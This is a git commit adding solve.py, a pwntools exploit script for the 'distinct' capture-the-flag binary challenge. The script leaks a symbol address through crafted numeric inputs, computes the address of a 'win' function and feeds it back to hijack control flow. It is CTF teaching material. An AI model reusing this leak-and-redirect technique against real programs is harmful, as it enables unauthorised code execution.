0e89bcb306b96972c4688c6107beb2b79a1d3c4d
Chandrasekaran Akash <enigmatrix2000@gmail.com>
2021-06-27 16:06:23 +0800

    pwn/distinct: inital commit

---
+++ Challenges/Binary/Reverse/Pwn/distinct/solve.py
@@ -0,0 +1,31 @@
+from pwn import *
+
+p = process("./distinct.out")
+e = ELF("./distinct.out")
+
+def enter(num):
+    p.sendlineafter(f'#', str(num))
+
+for i in range(15):
+    enter(0)
+enter(2**64 - 1)
+
+p.recvuntil('You have entered: \n')
+result = p.recvline()
+result = result.split(b' ')
+unique = int(result[-2])
+win = unique - e.symbols['unique'] + e.symbols['win']
+
+success(f"unique = {hex(unique)}")
+success(f"win = {hex(win)}")
+
+p.sendlineafter("Enter Again? (Y/N) ", 'Y')
+
+for i in range(15):
+    enter(i)
+enter(win)
+
+p.sendlineafter("Enter Again? (Y/N) ", 'N')
+
+
+p.interactive()
